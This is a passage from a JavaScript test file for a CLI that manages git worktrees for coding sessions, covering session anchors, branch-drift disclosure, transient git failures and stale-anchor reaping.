  assert.strictEqual(resumed.exclude.action, 'present');
  assert.strictEqual(keep.readAnchor(wt, KEY_A).record.lastSeenAt, NOW + 5000);
  const restarted = runCli('session-start', { WK_CWD: wt, WK_SESSION_KEY: KEY_A, WK_SOURCE: 'clear', WK_NOW: String(NOW + 9000), WK_IDLE_HOURS: '72' });
  assert.strictEqual(restarted.branch, 'claude/other');
});

test('cli prompt discloses a branch drift exactly once and clears it on the way back', () => {
  const repo = makeRepo('cli-prompt');
  const wt = addWorktree(repo, 'mu-1', 'claude/mu');
  runCli('session-start', { WK_CWD: wt, WK_SESSION_KEY: KEY_A, WK_SOURCE: 'startup', WK_NOW: String(NOW), WK_IDLE_HOURS: '72' });
  const quiet = runCli('prompt', { WK_CWD: wt, WK_SESSION_KEY: KEY_A, WK_NOW: String(NOW + 1000), WK_IDLE_HOURS: '72' });
  assert.strictEqual(quiet.disclosure, null);
  assert.strictEqual(quiet.drift, null);
  assert.strictEqual(quiet.anchor.unchanged, true);
  git(wt, ['checkout', '-q', '-b', 'claude/taker']);
  const drifted = runCli('prompt', { WK_CWD: wt, WK_SESSION_KEY: KEY_A, WK_NOW: String(NOW + 2000), WK_IDLE_HOURS: '72' });
  assert.deepStrictEqual(drifted.drift && { from: drifted.drift.from, to: drifted.drift.to }, { from: 'claude/mu', to: 'claude/taker' });
  assert.ok(typeof drifted.disclosure === 'string' && drifted.disclosure.includes('claude/taker') && drifted.disclosure.includes('git worktree add .claude/worktrees/claude-mu claude/mu'));
  const again = runCli('prompt', { WK_CWD: wt, WK_SESSION_KEY: KEY_A, WK_NOW: String(NOW + 3000), WK_IDLE_HOURS: '72' });
  assert.strictEqual(again.disclosure, null);
  assert.strictEqual(again.drift.to, 'claude/taker');
  git(wt, ['checkout', '-q', 'claude/mu']);
  const back = runCli('prompt', { WK_CWD: wt, WK_SESSION_KEY: KEY_A, WK_NOW: String(NOW + 4000), WK_IDLE_HOURS: '72' });
  assert.strictEqual(back.disclosure, null);
  assert.strictEqual(back.drift, null);
  assert.strictEqual(keep.readAnchor(wt, KEY_A).record.drift, null);
  git(wt, ['checkout', '-q', 'claude/taker']);
  const redisclosed = runCli('prompt', { WK_CWD: wt, WK_SESSION_KEY: KEY_A, WK_NOW: String(NOW + 5000), WK_IDLE_HOURS: '72' });
  assert.ok(typeof redisclosed.disclosure === 'string');
});

test('a transient git failure keeps a recorded drift instead of clearing it and re-disclosing', () => {
  const repo = makeRepo('cli-transient');
  const wt = addWorktree(repo, 'mu-2', 'claude/mu2');
  runCli('session-start', { WK_CWD: wt, WK_SESSION_KEY: KEY_A, WK_SOURCE: 'startup', WK_NOW: String(NOW), WK_IDLE_HOURS: '72' });
  git(wt, ['checkout', '-q', '-b', 'claude/taker2']);
  const drifted = runCli('prompt', { WK_CWD: wt, WK_SESSION_KEY: KEY_A, WK_NOW: String(NOW + 1000), WK_IDLE_HOURS: '72' });
  assert.ok(typeof drifted.disclosure === 'string');
  const noGit = fs.mkdtempSync(path.join(os.tmpdir(), 'wk-nopath-'));
  const blind = runCli('prompt', { WK_CWD: wt, WK_SESSION_KEY: KEY_A, WK_NOW: String(NOW + 2000), WK_IDLE_HOURS: '72', PATH: noGit });
  assert.deepStrictEqual(blind.faults, ['branch-unresolved']);
  assert.strictEqual(blind.disclosure, null);
  assert.strictEqual(keep.readAnchor(wt, KEY_A).record.drift.to, 'claude/taker2');
  const after = runCli('prompt', { WK_CWD: wt, WK_SESSION_KEY: KEY_A, WK_NOW: String(NOW + 3000), WK_IDLE_HOURS: '72' });
  assert.strictEqual(after.disclosure, null);
  assert.strictEqual(after.drift.to, 'claude/taker2');
});

test('a start whose branch read failed is backfilled by the next prompt instead of reported as a takeover', () => {
  const repo = makeRepo('cli-unresolved');
  const wt = addWorktree(repo, 'mu-3', 'claude/mu3');
  const noGit = fs.mkdtempSync(path.join(os.tmpdir(), 'wk-nopath2-'));
  const started = runCli('session-start', { WK_CWD: wt, WK_SESSION_KEY: KEY_A, WK_SOURCE: 'startup', WK_NOW: String(NOW), WK_IDLE_HOURS: '72', PATH: noGit });
  assert.deepStrictEqual(started.faults.filter((f) => f === 'branch-unresolved'), ['branch-unresolved']);
  assert.strictEqual(started.branch, null);
  assert.strictEqual(started.head, null);
  const first = runCli('prompt', { WK_CWD: wt, WK_SESSION_KEY: KEY_A, WK_NOW: String(NOW + 1000), WK_IDLE_HOURS: '72' });
  assert.strictEqual(first.disclosure, null);
  assert.strictEqual(first.drift, null);
  assert.strictEqual(keep.readAnchor(wt, KEY_A).record.branch, 'claude/mu3');
  git(wt, ['checkout', '-q', '-b', 'claude/taker3']);
  const drifted = runCli('prompt', { WK_CWD: wt, WK_SESSION_KEY: KEY_A, WK_NOW: String(NOW + 2000), WK_IDLE_HOURS: '72' });
  assert.strictEqual(drifted.drift.from, 'claude/mu3');
});

test('a stale anchor is retained until the reap window, so a takeover during the idle window is still disclosed', () => {
  const repo = makeRepo('cli-stale');
  const wt = addWorktree(repo, 'mu-4', 'claude/mu4');
  runCli('session-start', { WK_CWD: wt, WK_SESSION_KEY: KEY_A, WK_SOURCE: 'startup', WK_NOW: String(NOW), WK_IDLE_HOURS: '72' });
  const swept = keep.sweepSiblings(repo, NOW + IDLE + 1000, IDLE);
  assert.strictEqual(swept.removed, 1);
  assert.strictEqual(fs.existsSync(path.join(wt, keep.KEEP_FILENAME)), false);
  git(wt, ['checkout', '-q', '-b', 'claude/taker4']);
  const late = runCli('prompt', { WK_CWD: wt, WK_SESSION_KEY: KEY_A, WK_NOW: String(NOW + IDLE + 2000), WK_IDLE_HOURS: '72' });
  assert.ok(typeof late.disclosure === 'string');
  assert.strictEqual(late.drift.from, 'claude/mu4');
  assert.strictEqual(late.keep.action, 'created');
});

test('cli prompt refreshes lastSeenAt only after the refresh interval and re-creates a swept anchor', () => {
  const repo = makeRepo('cli-refresh');
  const wt = addWorktree(repo, 'nu-1', 'claude/nu');
  runCli('session-start', { WK_CWD: wt, WK_SESSION_KEY: KEY_A, WK_SOURCE: 'startup', WK_NOW: String(NOW), WK_IDLE_HOURS: '72' });
  runCli('prompt', { WK_CWD: wt, WK_SESSION_KEY: KEY_A, WK_NOW: String(NOW + keep.REFRESH_INTERVAL_MS - 1), WK_IDLE_HOURS: '72' });
  assert.strictEqual(keep.readAnchor(wt, KEY_A).record.lastSeenAt, NOW);
  runCli('prompt', { WK_CWD: wt, WK_SESSION_KEY: KEY_A, WK_NOW: String(NOW + keep.REFRESH_INTERVAL_MS), WK_IDLE_HOURS: '72' });
  assert.strictEqual(keep.readAnchor(wt, KEY_A).record.lastSeenAt, NOW + keep.REFRESH_INTERVAL_MS);
  fs.unlinkSync(keep.anchorPath(wt, KEY_A));
  fs.unlinkSync(path.join(wt, keep.KEEP_FILENAME));
  const healed = runCli('prompt', { WK_CWD: wt, WK_SESSION_KEY: KEY_A, WK_NOW: String(NOW + 2 * keep.REFRESH_INTERVAL_MS), WK_IDLE_HOURS: '72' });
  assert.strictEqual(healed.anchor.ok, true);
  assert.strictEqual(healed.keep.action, 'created');
  assert.strictEqual(healed.disclosure, null);
});

test('cli session-end removes the anchor and the marker, and every verb is inert outside a managed worktree', () => {
  const repo = makeRepo('cli-end');
  const wt = addWorktree(repo, 'xi-1', 'claude/xi');
  runCli('session-start', { WK_CWD: wt, WK_SESSION_KEY: KEY_A, WK_SOURCE: 'startup', WK_NOW: String(NOW), WK_IDLE_HOURS: '72' });
  runCli('session-start', { WK_CWD: wt, WK_SESSION_KEY: KEY_B, WK_SOURCE: 'startup', WK_NOW: String(NOW), WK_IDLE_HOURS: '72' });
  const endA = runCli('session-end', { WK_CWD: wt, WK_SESSION_KEY: KEY_A, WK_NOW: String(NOW + 1000), WK_IDLE_HOURS: '72' });
  assert.strictEqual(endA.anchor.action, 'removed');
  assert.strictEqual(endA.keep.action, 'kept');
  const endB = runCli('session-end', { WK_CWD: wt, WK_SESSION_KEY: KEY_B, WK_NOW: String(NOW + 2000), WK_IDLE_HOURS: '72' });
  assert.strictEqual(endB.keep.action, 'removed');
  assert.strictEqual(fs.existsSync(path.join(wt, keep.KEEP_FILENAME)), false);
  for (const verb of keep.VERBS) {
    const inert = runCli(verb, { WK_CWD: repo, WK_SESSION_KEY: KEY_A, WK_NOW: String(NOW), WK_IDLE_HOURS: '72' });
    assert.strictEqual(inert.managed, false);
    assert.deepStrictEqual(inert.faults, []);
  }
  assert.strictEqual(fs.existsSync(path.join(repo, keep.KEEP_FILENAME)), false);
  const badKey = runCli('session-start', { WK_CWD: wt, WK_SESSION_KEY: 'nope', WK_SOURCE: 'startup', WK_NOW: String(NOW), WK_IDLE_HOURS: '72' });
  assert.deepStrictEqual(badKey.faults, ['session-key-shape']);
  const unknown = runCli('nonsense', { WK_CWD: wt });
  assert.deepStrictEqual(unknown.faults, ['unknown-verb']);
});

test('sessionEnd of one session does not remove the marker another live session still holds, and the sweep reaps a twin past the reap window', () => {
  const repo = makeRepo('two-sessions');
  const wt = addWorktree(repo, 'omicron-1', 'claude/omicron');
  assert.strictEqual(keep.writeAnchor(wt, KEY_A, record(KEY_A, wt, { lastSeenAt: NOW })).ok, true);
  assert.strictEqual(keep.writeAnchor(wt, KEY_B, record(KEY_B, wt, { lastSeenAt: NOW - keep.REAP_FACTOR * IDLE - 1 })).ok, true);
  const result = keep.reconcileKeep(wt, NOW, IDLE);
  assert.strictEqual(result.action, 'created');
  assert.strictEqual(result.live, 1);
  assert.strictEqual(result.reaped, 1);
  assert.strictEqual(keep.readAnchor(wt, KEY_B).status, 'missing');
  const ended = keep.run('session-end', { cwd: wt, sessionKey: KEY_A, nowMs: NOW, idleMs: IDLE });
  assert.strictEqual(ended.keep.action, 'removed');
});
